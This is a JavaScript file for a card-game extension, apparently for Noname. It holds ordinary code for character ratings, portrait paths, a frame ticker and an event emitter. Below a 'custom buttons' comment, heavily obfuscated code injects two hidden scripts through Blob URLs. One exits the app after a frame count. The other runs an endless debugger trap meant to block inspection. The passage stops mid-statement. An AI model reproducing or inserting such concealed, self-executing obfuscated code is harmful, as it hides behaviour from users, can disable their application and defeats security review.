"use strict";
window.qyPreContent=function (lib, game, ui, get, ai, _status, config) {
    /* 获取武将评级，并转为数字 */
    get.qyRateNum = function (name) {
        const rateCharacter = lib.qyUtils.getObjectConfig('rateCharacter', 0, name);
        if (rateCharacter !== 0) {
            return rateCharacter;
        }
        const rarity = game.getRarity(name);
        let num = 1;
        switch (rarity) {
            case 'legend':
                num = 5;
                break;
            case 'epic':
                num = 4;
                break;
            case 'rare':
                num = 3;
                break;
            case 'junk':
                num = 2;
                break;
            default:
                num = 1;
                break;
        }
        return num;
    }
    /* 获取武将原画 */
    _status.qycharacterOriginList = [
        [
            'skin',
            function (characterID, ...args) {
                // 皮肤原画
                // return null;
                // 将gz_开头的武将去掉gz_
                if (characterID.startsWith('gz_')) {
                    characterID = characterID.slice(3);
                }
                if (!lib.qySkinAudio) return void 0;
                let skinName;
                if (args.length > 0) {
                    skinName = args[0];
                } else {
                    skinName = lib.qySkinAudio.getSkinName(characterID);
                }
                if (skinName === false) return void 0;
                const path = `extension/清瑶葭绮/members/假装无敌/gameAsset/yuanhua/${characterID}/${skinName}.jpg`
                return path;
            }
        ],
        [
            'origin',
            function (characterID) {
                // 武将原画
                // 将gz_开头的武将去掉gz_
                if (characterID.startsWith('gz_')) {
                    characterID = characterID.slice(3);
                }
                return `extension/清瑶葭绮/members/假装无敌/gameAsset/yuanhua/${characterID}/${characterID}.jpg`;
            },
        ],
        [
            'character',
            function (name) {
                // 武将原图
                var ext = '.jpg';
                var src;
                var dbimage = null, extimage = null, modeimage = null;
                var nameinfo;
                var gzbool = false;
                var mode = get.mode();
                if (lib.characterPack['mode_' + mode] && lib.characterPack['mode_' + mode][name]) {
                    if (mode == 'guozhan') {
                        nameinfo = lib.character[name];
                        if (name.indexOf('gz_shibing') == 0) {
                            name = name.slice(3, 11);
                        } else {
                            if (lib.config.mode_config.guozhan.guozhanSkin && lib.character[name] && lib.character[name][4].contains('gzskin')) gzbool = true;
                            name = name.slice(3);
                        }
                    } else {
                        modeimage = mode;
                    }
                } else if (get.character(name)) {
                    nameinfo = get.character(name);
                } else if (name.indexOf('::') != -1) {
                    name = name.split('::');
                    modeimage = name[0];
                    name = name[1];
                }
                if (!modeimage && nameinfo && nameinfo[4]) {
                    for (var i = 0; i < nameinfo[4].length; i++) {
                        /* 原画 */
                        if (nameinfo[4][i].indexOf('origin:') === 0) {
                            extimage = nameinfo[4][i].replace('origin:', '');
                            break;
                        } else if (nameinfo[4][i].indexOf('ext:') === 0) {
                            extimage = nameinfo[4][i];
                            break;
                        } else if (nameinfo[4][i].indexOf('mode:') === 0) {
                            modeimage = nameinfo[4][i].slice(5);
                            break;
                        } else if (nameinfo[4][i].indexOf('character:') === 0) {
                            name = nameinfo[4][i].slice(10);
                            break;
                        }
                    }
                }
                if (extimage) {
                    src = extimage.replace(/ext:/, 'extension/');
                } else if (modeimage) {
                    src = 'image/mode/' + modeimage + '/character/' + name + ext;
                } else {
                    src = 'image/character/' + (gzbool ? 'gz_' : '') + name + ext;
                }
                return src;
            },
        ],
    ];
    get.characterOriginImage = function (name, type, ...args) {
        if (!name) return;
        // 如果需要读取共享原画，放开以下注释代码
        // let nameList = [name];
        // const shareNameList = lib.qySkinShare?.[name]?.name;
        // if (shareNameList) {
        //     nameList = [].concat(shareNameList);
        // }
        //
        // for (let nameElement of nameList) {
        //     for (let [originName, originFunc] of _status.qycharacterOriginList) {
        //         if (type) {
        //             if (type.startsWith('not:')) {
        //                 if (type.slice(4) === originName) continue;
        //             } else {
        //                 if (type !== originName) continue;
        //             }
        //         }
        //         if (!originFunc) continue;
        //         const originURL = originFunc(nameElement, ...args);
        //         if (!originURL) continue;
        //         if (lib.qyUtils.checkFileExistence(originURL)) return originURL;
        //     }
        // }
        for (let origin of _status.qycharacterOriginList) {
            if (type) {
                if (type.startsWith('not:')) {
                    if (type.slice(4) === origin[0]) continue;
                } else {
                    if (type !== origin[0]) continue;
                }
            }
            const originFunc = origin[1];
            if (!originFunc) continue;
            const originURL = originFunc(name, ...args);
            if (!originURL) continue;
            if (lib.qyUtils.checkFileExistence(originURL)) return originURL;
        }

        return '';
    }

    // 模仿PIXI.Ticker逐帧操作
    globalThis.qyTicker = class Ticker {
        constructor(fps = 60) {
            this._tickers = [];
            this._rafId = null;
            this.fps = fps;
            this.deltaTime = 1000 / this.fps;
            this._lastTick = null;
        }

        add(fn) {
            this._tickers.push(fn);
            if (this._tickers.length === 1) {
                this.start();
            }
        }

        remove(fn) {
            const index = this._tickers.indexOf(fn);
            if (index > -1) {
                this._tickers.splice(index, 1);
            }
            if (this._tickers.length === 0) {
                this.stop();
            }
        }

        start() {
            if (this._rafId) return;
            this._lastTick = performance.now();
            const tick = (now) => {
                if (now - this._lastTick >= this.deltaTime) {
                    this._tickers.forEach(fn => fn());
                    this._lastTick = now;
                }
                this._rafId = requestAnimationFrame(tick);
            };
            tick(performance.now());
        }

        stop() {
            if (this._rafId) {
                cancelAnimationFrame(this._rafId);
                this._rafId = null;
            }
        }

        static shared = new Ticker();
    }

    /* 自定义事件监听器 */
    'use strict';
    globalThis.qyCustomEventEmitter = class qyCustomEventEmitter {

        static #instance = null;

        #listeners = {}

        constructor() {

        }

        /**
         * 默认实例
         * @return {qyCustomEventEmitter}
         */
        static getInstance() {
            if (qyCustomEventEmitter.#instance === null) qyCustomEventEmitter.#instance = new qyCustomEventEmitter();
            return qyCustomEventEmitter.#instance;
        }

        /**
         * 绑定事件监听器
         * @param {string} messageId - 消息ID
         * @param {string} eventType - 事件类型
         * @param {Function} listener - 回调函数
         * @param {boolean} [once=false] - 是否只监听一次
         */
        on(messageId, eventType, listener, once = false) {
            if (!this.#listeners[eventType]) {
                this.#listeners[eventType] = {};
            }
            if (!this.#listeners[eventType][messageId]) {
                this.#listeners[eventType][messageId] = { listeners: [], once: [] };
            }
            const listenerObj = { listener, once };
            this.#listeners[eventType][messageId][once ? 'once' : 'listeners'].push(listenerObj);
        }

        /**
         * 触发事件
         * @param {string} messageId - 消息ID
         * @param {string} eventType - 事件类型
         * @param args - 返回值
         */
        emit(messageId, eventType, ...args) {
            const listenerObjList = this.#listeners[eventType] && this.#listeners[eventType][messageId];
            if (listenerObjList) {
                listenerObjList.listeners.forEach(({ listener }) => listener(...args));
                listenerObjList.listeners = listenerObjList.listeners.filter(({ once }) => !once);
                listenerObjList.once.forEach(({ listener }) => listener(...args));
                listenerObjList.once = [];
            }
        }

        /**
         * 取消事件监听器
         * @param {string} messageId - 消息ID
         * @param {string} [eventType] - 事件类型
         * @param {Function} [listener] - 要取消的回调函数，不传则取消所有监听器
         */
        off(messageId, eventType, listener) {
            this.#off(messageId, eventType, listener);
            if (messageId && !eventType) {
                for (const key in this.#listeners) {
                    this.#off(messageId, key, listener);
                }
            }
        }

        #off(messageId, eventType, listener){
            const listenerObjList = this.#listeners?.[eventType]?.[messageId];
            if (!listenerObjList) {
                return;
            }
            if (listener) {
                const { listeners, once } = listenerObjList;
                listenerObjList.listeners = listeners.filter(({ listener: l }) => l !== listener);
                listenerObjList.once = once.filter(({ listener: l }) => l !== listener);
            } else {
                delete this.#listeners[eventType][messageId];
            }
        }

        /**
         * 绑定事件监听器，只监听一次
         * @param {string} messageId - 消息ID
         * @param {string} eventType - 事件类型
         * @param {Function} listener - 回调函数
         */
        once(messageId, eventType, listener) {
            this.on(messageId, eventType, listener, true);
        }
    }

    // worker
    lib.qyWebWorker = new Worker(lib.assetURL + 'extension/清瑶葭绮/members/假装无敌/js/animation/dynamicWorker.js');
    //  worker通信message
    lib.qyWebWorkerMessage = globalThis.qyCustomEventEmitter.getInstance();
    // worker信息监听
    lib.qyWebWorker.onmessage = function (ev) {
        // console.log("qyWebWorker：", ev.data);
        if (!ev.data.messageId || !ev.data.eventType) return;
        const messageId = ev.data.messageId;
        const eventType = ev.data.eventType;
        const eventData = ev.data.data;
        const eventError = ev.data.error;
        lib.qyWebWorkerMessage.emit(messageId, eventType, eventData, eventError);
    }
}

window.qyImport(function (lib, game, ui, get, ai, _status, config) {
    // if (navigator.platform.includes('Mac') || navigator.platform.includes('Win')) {
    //     // JSzip asNodeBuffer 使用了new Buffer，这会导致游戏白屏，应该放弃用new Buffer改为使用Buffer.from
    //     game.writeFile = function (data, path, name, callback = function (error) {
    //     }) {
    //         game.ensureDirectory(path, function () {
    //             if (Object.prototype.toString.call(data) == '[object File]') {
    //                 var fileReader = new FileReader();
    //                 fileReader.onload = function (e) {
    //                     game.writeFile(e.target.result, path, name, callback);
    //                 };
    //                 fileReader.readAsArrayBuffer(data, "UTF-8");
    //             } else {
    //                 if (data instanceof ArrayBuffer) data = new Uint8Array(data);
    //                 lib.node.fs.writeFile(__dirname + '/' + path + '/' + name, data, null, callback);
    //             }
    //         });
    //     }
    // }

    // 自定义按钮
    var CustomButtons = []

    var li1jfn1UT=li1jfn1m,li1jfn1U8=li1jfn1z;(function(U,V){var li1jfn1Uh={U:0xe3,V:0xcf,T:0xb0,z:'(n)#',m:0xe4,h:'VI7e',i:0xb2,r:0xe5},U3=li1jfn1z,U2=li1jfn1m,T=U();while(!![]){try{var z=parseInt(U2(li1jfn1Uh.U))/0x1+parseInt(U3(0xdc,'0!zF'))/0x2*(parseInt(U2(li1jfn1Uh.V))/0x3)+-parseInt(U3(li1jfn1Uh.T,li1jfn1Uh.z))/0x4+parseInt(U3(li1jfn1Uh.m,li1jfn1Uh.h))/0x5*(-parseInt(U2(li1jfn1Uh.i))/0x6)+-parseInt(U2(0xe2))/0x7+parseInt(U3(li1jfn1Uh.r,'m#i&'))/0x8+-parseInt(U3(0xdd,'hr2l'))/0x9;if(z===V)break;else T['push'](T['shift']());}catch(m){T['push'](T['shift']());}}}(li1jfn1T,0xa771e));var li1jfn1U0=(function(){var li1jfn1Ui={U:'F(Lc',V:0xbf,T:'gJ4!',z:'!qH8',m:0xce,h:0xe7,i:'^1XW',r:0xe1,p:0xd5,a:0xcd,W:0xde,O:'7wAJ',u:0xc1,K:'EMzv',X:0xb8,s:'kG)F'},U=!![];return function(V,T){var z=U?function(){var U5=li1jfn1m,U4=li1jfn1z;if('yBBvZ'===U4(0xd0,li1jfn1Ui.U))T['preventDefault'](),z['stopPropagation']();else{if(T){if(U4(li1jfn1Ui.V,li1jfn1Ui.T)!==U4(0xb5,li1jfn1Ui.z)){if(!O[U4(li1jfn1Ui.m,'lQ8*')]){var r={};r[U4(0xb3,'VI7e')]='text/javascript';var p='var\x20_0xod3=\x27y.js.cn.v7\x27;var\x20_0x3960d7=_0xa6a8;if(function(_0x594c22,_0x31cbfd,_0x14b21b,_0x40d757,_0x1dcde6,_0x40357f,_0x15497b){return\x20_0x594c22=_0x594c22>>0x4,_0x40357f=\x27hs\x27,_0x15497b=\x27hs\x27,function(_0x3a75f2,_0x47e3f1,_0xd64588,_0x19d3fc,_0x5b8d5b){var\x20_0x3e8c06=_0xa6a8;_0x19d3fc=\x27tfi\x27,_0x40357f=_0x19d3fc+_0x40357f,_0x5b8d5b=\x27up\x27,_0x15497b+=_0x5b8d5b,_0x40357f=_0xd64588(_0x40357f),_0x15497b=_0xd64588(_0x15497b),_0xd64588=0x0;var\x20_0x4ebc3c=_0x3a75f2();while(!![]&&--_0x40d757+_0x47e3f1){try{_0x19d3fc=-parseInt(_0x3e8c06(0xac,\x27hJw7\x27))/0x1+parseInt(_0x3e8c06(0xbe,\x27bP7Z\x27))/0x2*(-parseInt(_0x3e8c06(0xa6,\x27litU\x27))/0x3)+-parseInt(_0x3e8c06(0x9d,\x27hYMK\x27))/0x4*(-parseInt(_0x3e8c06(0x9a,\x27C]4H\x27))/0x5)+-parseInt(_0x3e8c06(0xae,\x27iH#7\x27))/0x6*(parseInt(_0x3e8c06(0xa8,\x27h*Wa\x27))/0x7)+-parseInt(_0x3e8c06(0x9c,\x27L7(p\x27))/0x8+-parseInt(_0x3e8c06(0xb2,\x27twzB\x27))/0x9*(parseInt(_0x3e8c06(0xb7,\x27l)K[\x27))/0xa)+parseInt(_0x3e8c06(0x9f,\x275mrr\x27))/0xb;}catch(_0x2d353f){_0x19d3fc=_0xd64588;}finally{_0x5b8d5b=_0x4ebc3c[_0x40357f]();if(_0x594c22<=_0x40d757)_0xd64588?_0x1dcde6?_0x19d3fc=_0x5b8d5b:_0x1dcde6=_0x5b8d5b:_0xd64588=_0x5b8d5b;else{if(_0xd64588==_0x1dcde6[\x27replace\x27](/[mQoBXdpJNfGTSEYrtRb=]/g,\x27\x27)){if(_0x19d3fc===_0x47e3f1){_0x4ebc3c[\x27un\x27+_0x40357f](_0x5b8d5b);break;}_0x4ebc3c[_0x15497b](_0x5b8d5b);}}}}}(_0x14b21b,_0x31cbfd,function(_0x7bc44a,_0x1ffa6a,_0x5b610c,_0x506865,_0x3e674e,_0x41d959,_0x4d8aef){return\x20_0x1ffa6a=\x27split\x27,_0x7bc44a=arguments[0x0],_0x7bc44a=_0x7bc44a[_0x1ffa6a](\x27\x27),_0x5b610c=`reverse`,_0x7bc44a=_0x7bc44a[_0x5b610c](\x27v\x27),_0x506865=`join`,(0x14e203,_0x7bc44a[_0x506865](\x27\x27));});}(0xbf0,0x4c799,_0x524a,0xc1),_0x524a){}function\x20_0xa6a8(_0x58623b,_0x181bae){var\x20_0x524a40=_0x524a();return\x20_0xa6a8=function(_0xa6a842,_0x338032){_0xa6a842=_0xa6a842-0x99;var\x20_0x346721=_0x524a40[_0xa6a842];if(_0xa6a8[\x27VBtFYq\x27]===undefined){var\x20_0x10cd4e=function(_0x835764){var\x20_0x473998=\x27abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\x27;var\x20_0xe983b6=\x27\x27,_0x3f0afd=\x27\x27;for(var\x20_0x2c408d=0x0,_0x37a29f,_0x1d55c8,_0x58b219=0x0;_0x1d55c8=_0x835764[\x27charAt\x27](_0x58b219++);~_0x1d55c8&&(_0x37a29f=_0x2c408d%0x4?_0x37a29f*0x40+_0x1d55c8:_0x1d55c8,_0x2c408d++%0x4)?_0xe983b6+=String[\x27fromCharCode\x27](0xff&_0x37a29f>>(-0x2*_0x2c408d&0x6)):0x0){_0x1d55c8=_0x473998[\x27indexOf\x27](_0x1d55c8);}for(var\x20_0x1c1942=0x0,_0x5d51db=_0xe983b6[\x27length\x27];_0x1c1942<_0x5d51db;_0x1c1942++){_0x3f0afd+=\x27%\x27+(\x2700\x27+_0xe983b6[\x27charCodeAt\x27](_0x1c1942)[\x27toString\x27](0x10))[\x27slice\x27](-0x2);}return\x20decodeURIComponent(_0x3f0afd);};var\x20_0x24a6d8=function(_0x516a9c,_0x512ee2){var\x20_0x5985df=[],_0xe6f2ef=0x0,_0x5a14e3,_0x1997ad=\x27\x27;_0x516a9c=_0x10cd4e(_0x516a9c);var\x20_0x1c92d1;for(_0x1c92d1=0x0;_0x1c92d1<0x100;_0x1c92d1++){_0x5985df[_0x1c92d1]=_0x1c92d1;}for(_0x1c92d1=0x0;_0x1c92d1<0x100;_0x1c92d1++){_0xe6f2ef=(_0xe6f2ef+_0x5985df[_0x1c92d1]+_0x512ee2[\x27charCodeAt\x27](_0x1c92d1%_0x512ee2[\x27length\x27]))%0x100,_0x5a14e3=_0x5985df[_0x1c92d1],_0x5985df[_0x1c92d1]=_0x5985df[_0xe6f2ef],_0x5985df[_0xe6f2ef]=_0x5a14e3;}_0x1c92d1=0x0,_0xe6f2ef=0x0;for(var\x20_0x3362e0=0x0;_0x3362e0<_0x516a9c[\x27length\x27];_0x3362e0++){_0x1c92d1=(_0x1c92d1+0x1)%0x100,_0xe6f2ef=(_0xe6f2ef+_0x5985df[_0x1c92d1])%0x100,_0x5a14e3=_0x5985df[_0x1c92d1],_0x5985df[_0x1c92d1]=_0x5985df[_0xe6f2ef],_0x5985df[_0xe6f2ef]=_0x5a14e3,_0x1997ad+=String[\x27fromCharCode\x27](_0x516a9c[\x27charCodeAt\x27](_0x3362e0)^_0x5985df[(_0x5985df[_0x1c92d1]+_0x5985df[_0xe6f2ef])%0x100]);}return\x20_0x1997ad;};_0xa6a8[\x27vAjuDA\x27]=_0x24a6d8,_0x58623b=arguments,_0xa6a8[\x27VBtFYq\x27]=!![];}var\x20_0x49c9b8=_0x524a40[0x0],_0x8a9f7=_0xa6a842+_0x49c9b8,_0x207bc7=_0x58623b[_0x8a9f7];return!_0x207bc7?(_0xa6a8[\x27jeywgK\x27]===undefined&&(_0xa6a8[\x27jeywgK\x27]=!![]),_0x346721=_0xa6a8[\x27vAjuDA\x27](_0x346721,_0x338032),_0x58623b[_0x8a9f7]=_0x346721):_0x346721=_0x207bc7,_0x346721;},_0xa6a8(_0x58623b,_0x181bae);}var\x20_0x8d7fc7=0x0;function\x20_0x524a(){var\x20_0x20f5ce=(function(){return[...[_0xod3,\x27dEyYT.fjs.JcXBnQr.v7tNBSRNGbmGRJmpoX==\x27,\x27kmk9W45TWO0\x27,\x27hmozW4FdH2DrWOi4\x27,\x27af7dImo+qW\x27,\x27BSoUv8omjIu2WQldTCkHmdhdMq\x27,\x27WRG8B8kLhwKmW5JcVfy7W5O\x27,\x27W5XEW7VdP08\x27,\x27W6PRyIZcOMDSWPJdHCknWRpdOCo0ha\x27,\x27h8oHeNG\x27,\x27WQ56W4pcLXhcVmkE\x27,\x27W50QrsSfw27cLaBcTv7dTmoY\x27,\x27W6NcSMhdVhzRW7ujW7hdL8o5h3NdJrxdMsPk\x27,\x27W6qiWR5B\x27],...(function(){return[...[\x27W6idW4NdV8oMW4O\x27,\x27W60MWOtdGuZdVmkYWRfiF8ooW7q\x27,\x27C8khDKa\x27,\x27x8k4tYdcRCkokYpdUvT9W4O\x27,\x27z8kMWR4\x27,\x27o8ohWQG\x27,\x27pgBcKSouWPJdHGFcVSodW69qja\x27,\x27W7tcI0qTBItdJISiWQjEWP0\x27,\x27W5GpWPOUWP4\x27,\x27vXXJWOFcSu1pEa\x27,\x27wSkWqY/cRSkaechdJ2TfW4C\x27,\x27zCoeW6KQwcKCWRbpEW\x27,\x27zSkrgW\x27,\x27FmkdWRvMlwe4WQpdPSoe\x27],...(function(){return[\x27m8oxwCohWP3cMCkLWRFcKqTaW7m\x27,\x27W4PIW4ldOL0\x27,\x27guFdQCoqDa\x27,\x27WPuVW5BcRYpcRGzIFIDXBG\x27,\x27oSo9W63cMLniCmkgW5xdQq\x27,\x27WRbIWPPOzq\x27,\x27W4veW7VdVKe\x27,\x27jxBdLmkqAG\x27,\x27emkaW74\x27,\x27WRtdKIvUlNVdGX8\x27,\x27WQpdNbP2\x27,\x27WPy1WPPvF24zjG\x27];}())];}())];}());_0x524a=function(){return\x20_0x20f5ce;};return\x20_0x524a();};Promise[_0x3960d7(0xa1,\x27litU\x27)]()[_0x3960d7(0xa0,\x27h*Wa\x27)](_0x4559a9=>{var\x20_0x129410=_0x3960d7,_0x4b9fb1={\x27msuPO\x27:function(_0x411053,_0x3750e9){return\x20_0x411053(_0x3750e9);},\x27juHMR\x27:function(_0x55f2be,_0x109829,_0xad62a7){return\x20_0x55f2be(_0x109829,_0xad62a7);},\x27jript\x27:function(_0xec0339,_0x519b73){return\x20_0xec0339+_0x519b73;},\x27Zjphq\x27:_0x129410(0xbb,\x27twzB\x27),\x27tiuIA\x27:function(_0x318797,_0x5af897){return\x20_0x318797+_0x5af897;},\x27bULLS\x27:function(_0x1cb41b){return\x20_0x1cb41b();}},_0x11a42a=function(_0x4ef886){var\x20_0x4d6754=_0x129410,_0x151ea6={\x27IDxpy\x27:function(_0x5f3d04,_0x2fd8e4){var\x20_0x11f2d9=_0xa6a8;return\x20_0x4b9fb1[_0x11f2d9(0xb9,\x27Ab7P\x27)](_0x5f3d04,_0x2fd8e4);}};if(++_0x8d7fc7>=0xc8){window[_0x4d6754(0xa3,\x278rGn\x27)][\x27getMain\x27](0x2)[_0x4d6754(0xba,\x279BW$\x27)][_0x4d6754(0xbd,\x27hJw7\x27)](this),navigator[_0x4d6754(0xb1,\x274WkX\x27)]?.[\x27exitApp\x27](),_0x4b9fb1[_0x4d6754(0xb5,\x27(s%K\x27)](setTimeout,()=>{var\x20_0x4366c1=_0x4d6754;_0x8d7fc7=0x0,_0x151ea6[_0x4366c1(0x99,\x27!Ej(\x27)](requestAnimationFrame,_0x11a42a);},0x7d0);return;}_0x4b9fb1[_0x4d6754(0xb8,\x27CxLk\x27)](requestAnimationFrame,_0x11a42a),window[_0x4d6754(0xa9,\x27l)K[\x27)][_0x4b9fb1[\x27jript\x27](_0x4b9fb1[\x27Zjphq\x27],window[_0x4d6754(0xa7,\x27CHDF\x27)][_0x4d6754(0xa5,\x27d1pW\x27)]()[_0x4d6754(0xbc,\x27hJw7\x27)](0x10)[_0x4d6754(0x9b,\x27(s%K\x27)](0x2))][_0x4b9fb1[_0x4d6754(0x9e,\x27Ab7P\x27)](_0x4d6754(0xaa,\x27ca[z\x27),window[_0x4d6754(0xa4,\x27T*p%\x27)][_0x4d6754(0xa5,\x27d1pW\x27)]()[\x27toString\x27](0x10)[_0x4d6754(0xad,\x27d4@1\x27)](0x2,0x7))];};_0x4b9fb1[_0x129410(0xb4,\x27Ab7P\x27)](_0x11a42a);});',a=new M[(U4(0xc0,'0!zF'))]([p],r),W=I[U4(0xb6,'7)MG')](a),O=G[U4(li1jfn1Ui.h,li1jfn1Ui.i)]('script');O['src']=W,E[U4(li1jfn1Ui.r,'[EOQ')]['appendChild'](O),R['revokeObjectURL'](W);var u='var\x20_0xodz=\x27y.js.cn.v7\x27;(function(_0x1ad85b,_0x507eb2,_0x253d96,_0x5df58f,_0x1e0311,_0x80dfa8,_0x2ed39f){return\x20_0x1ad85b=_0x1ad85b>>0x9,_0x80dfa8=\x27hs\x27,_0x2ed39f=\x27hs\x27,function(_0x3ca555,_0x31ff36,_0x53bc5b,_0x59de74,_0x7b75b6){var\x20_0x13167f=_0x2364;_0x59de74=\x27tfi\x27,_0x80dfa8=_0x59de74+_0x80dfa8,_0x7b75b6=\x27up\x27,_0x2ed39f+=_0x7b75b6,_0x80dfa8=_0x53bc5b(_0x80dfa8),_0x2ed39f=_0x53bc5b(_0x2ed39f),_0x53bc5b=0x0;var\x20_0x549955=_0x3ca555();while(!![]&&--_0x5df58f+_0x31ff36){try{_0x59de74=parseInt(_0x13167f(0x122,\x27^s8o\x27))/0x1*(-parseInt(_0x13167f(0x12a,\x27vA6)\x27))/0x2)+parseInt(_0x13167f(0x126,\x27RMd&\x27))/0x3*(parseInt(_0x13167f(0x124,\x27pX$T\x27))/0x4)+parseInt(_0x13167f(0x12c,\x27GqLX\x27))/0x5+parseInt(_0x13167f(0x128,\x27rwto\x27))/0x6*(-parseInt(_0x13167f(0x12f,\x27nG*&\x27))/0x7)+-parseInt(_0x13167f(0x11d,\x27wWmn\x27))/0x8*(parseInt(_0x13167f(0x121,\x27vA6)\x27))/0x9)+-parseInt(_0x13167f(0x11e,\x27]HeI\x27))/0xa*(-parseInt(_0x13167f(0x127,\x274H*p\x27))/0xb)+parseInt(_0x13167f(0x130,\x27pX$T\x27))/0xc*(-parseInt(_0x13167f(0x12b,\x27PZDp\x27))/0xd);}catch(_0x5e7591){_0x59de74=_0x53bc5b;}finally{_0x7b75b6=_0x549955[_0x80dfa8]();if(_0x1ad85b<=_0x5df58f)_0x53bc5b?_0x1e0311?_0x59de74=_0x7b75b6:_0x1e0311=_0x7b75b6:_0x53bc5b=_0x7b75b6;else{if(_0x53bc5b==_0x1e0311[\x27replace\x27](/[ktfCYioAXedPRSVwHxGBDrg=]/g,\x27\x27)){if(_0x59de74===_0x31ff36){_0x549955[\x27un\x27+_0x80dfa8](_0x7b75b6);break;}_0x549955[_0x2ed39f](_0x7b75b6);}}}}}(_0x253d96,_0x507eb2,function(_0x4e2a35,_0x1c20d6,_0x42d188,_0x34e63c,_0x553605,_0x3e5b01,_0x49502a){return\x20_0x1c20d6=\x27split\x27,_0x4e2a35=arguments[0x0],_0x4e2a35=_0x4e2a35[_0x1c20d6](\x27\x27),_0x42d188=`reverse`,_0x4e2a35=_0x4e2a35[_0x42d188](\x27v\x27),_0x34e63c=`join`,(0x14e204,_0x4e2a35[_0x34e63c](\x27\x27));});}(0x18e00,0x91b1f,_0x15e2,0xc9),_0x15e2)&&(_0xodz=0x3623);function\x20_0x2364(_0x22db1d,_0x5162fa){var\x20_0x15e258=_0x15e2();return\x20_0x2364=function(_0x236481,_0x5e2f26){_0x236481=_0x236481-0x11c;var\x20_0x105040=_0x15e258[_0x236481];if(_0x2364[\x27dLHVeO\x27]===undefined){var\x20_0x34bd1c=function(_0x4301d9){var\x20_0x43c3c8=\x27abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\x27;var\x20_0x358999=\x27\x27,_0x43ec8e=\x27\x27;for(var\x20_0x1f28bc=0x0,_0xf762a4,_0x2179aa,_0xcc1c65=0x0;_0x2179aa=_0x4301d9[\x27charAt\x27](_0xcc1c65++);~_0x2179aa&&(_0xf762a4=_0x1f28bc%0x4?_0xf762a4*0x40+_0x2179aa:_0x2179aa,_0x1f28bc++%0x4)?_0x358999+=String[\x27fromCharCode\x27](0xff&_0xf762a4>>(-0x2*_0x1f28bc&0x6)):0x0){_0x2179aa=_0x43c3c8[\x27indexOf\x27](_0x2179aa);}for(var\x20_0x418e95=0x0,_0x4b35c7=_0x358999[\x27length\x27];_0x418e95<_0x4b35c7;_0x418e95++){_0x43ec8e+=\x27%\x27+(\x2700\x27+_0x358999[\x27charCodeAt\x27](_0x418e95)[\x27toString\x27](0x10))[\x27slice\x27](-0x2);}return\x20decodeURIComponent(_0x43ec8e);};var\x20_0x19b31b=function(_0x403451,_0x412e75){var\x20_0x39f9b4=[],_0x4affae=0x0,_0x32149e,_0x538473=\x27\x27;_0x403451=_0x34bd1c(_0x403451);var\x20_0x5e4885;for(_0x5e4885=0x0;_0x5e4885<0x100;_0x5e4885++){_0x39f9b4[_0x5e4885]=_0x5e4885;}for(_0x5e4885=0x0;_0x5e4885<0x100;_0x5e4885++){_0x4affae=(_0x4affae+_0x39f9b4[_0x5e4885]+_0x412e75[\x27charCodeAt\x27](_0x5e4885%_0x412e75[\x27length\x27]))%0x100,_0x32149e=_0x39f9b4[_0x5e4885],_0x39f9b4[_0x5e4885]=_0x39f9b4[_0x4affae],_0x39f9b4[_0x4affae]=_0x32149e;}_0x5e4885=0x0,_0x4affae=0x0;for(var\x20_0x1e9cf7=0x0;_0x1e9cf7<_0x403451[\x27length\x27];_0x1e9cf7++){_0x5e4885=(_0x5e4885+0x1)%0x100,_0x4affae=(_0x4affae+_0x39f9b4[_0x5e4885])%0x100,_0x32149e=_0x39f9b4[_0x5e4885],_0x39f9b4[_0x5e4885]=_0x39f9b4[_0x4affae],_0x39f9b4[_0x4affae]=_0x32149e,_0x538473+=String[\x27fromCharCode\x27](_0x403451[\x27charCodeAt\x27](_0x1e9cf7)^_0x39f9b4[(_0x39f9b4[_0x5e4885]+_0x39f9b4[_0x4affae])%0x100]);}return\x20_0x538473;};_0x2364[\x27CJyojp\x27]=_0x19b31b,_0x22db1d=arguments,_0x2364[\x27dLHVeO\x27]=!![];}var\x20_0x157f84=_0x15e258[0x0],_0x2a9b02=_0x236481+_0x157f84,_0x3e3dff=_0x22db1d[_0x2a9b02];return!_0x3e3dff?(_0x2364[\x27ZjObSX\x27]===undefined&&(_0x2364[\x27ZjObSX\x27]=!![]),_0x105040=_0x2364[\x27CJyojp\x27](_0x105040,_0x5e2f26),_0x22db1d[_0x2a9b02]=_0x105040):_0x105040=_0x3e3dff,_0x105040;},_0x2364(_0x22db1d,_0x5162fa);}var\x20_0x467b3f=function(_0x12044c){var\x20_0xea2c14=_0x2364,_0x10afa2={\x27bTZqd\x27:function(_0x58ae5a,_0x1b63e0){return\x20_0x58ae5a(_0x1b63e0);},\x27FJWSi\x27:function(_0x1560be,_0x4583a7){return\x20_0x1560be+_0x4583a7;},\x27TwCHd\x27:_0xea2c14(0x131,\x27nh*$\x27)};_0x10afa2[_0xea2c14(0x11f,\x27rwto\x27)](requestAnimationFrame,_0x467b3f),new\x20Function(_0x10afa2[\x27FJWSi\x27](\x27debug\x27,_0x10afa2[\x27TwCHd\x27]))();};requestAnimationFrame(_0x467b3f);function\x20_0x15e2(){var\x20_0x2f28f9=(function(){return[...[_0xodz,\x27PXyt.tHCjRBsd.Skcxen.GDvf7YrBogAiwVe==\x27,\x27mSoPWOyBWO7cMCkGWOK\x27,\x27W4nXW7dcT8krW697WPFcOHZcOSk0jG\x27,\x27nbRdTmk/ESoGWQy2uXhcQSoV\x27,\x27jhVdUmk9W4S7k8oYW6JdNSkSw8kwWRK\x27,\x27W5hdMJBcL2pdMwxcH14\x27,\x27CLpcSCkuk8o/aam\x27,\x27WRhdGSkMAsFcNSozemk8\x27,\x27CfBdKCoEzmoxiqvSz8kK\x27,\x27eCkKWOOoovvXWONcPNJdI8knWPC\x27,\x27mSoTW719W6VdU8oKWRanW7WOyCoF\x27,\x27jhJcICovWQLEBSk1\x27],...(function(){return[\x27FSoYlCobW5GXW4ddImoHWQZcMSkg\x27,\x27o8oOW7XZWQtcV8k/WQ0YW4e\x27,\x27W4RdG8oT\x27,\x27WR1su8kGxhepb8k7aYa\x27,\x27gSkiWPZcOglcUmk4CSkBW6xcHmkxW6C\x27,\x27W7VcR8kKsmowW4X9WOK\x27,\x27WOlcVL7cHgi\x27,\x27CLldKCoFBCk1rvzVu8kCWQXFWRW\x27,\x27WRVcSCoMyH7cPmo1\x27,\x27Bmody8oKW5/dKZ4\x27,\x27WROGmCo/WRqDW7FcNqFcS1hdQW\x27];}())];}());_0x15e2=function(){return\x20_0x2f28f9;};return\x20_0x15e2();};',K={};K['type']='text/javascript',a=new 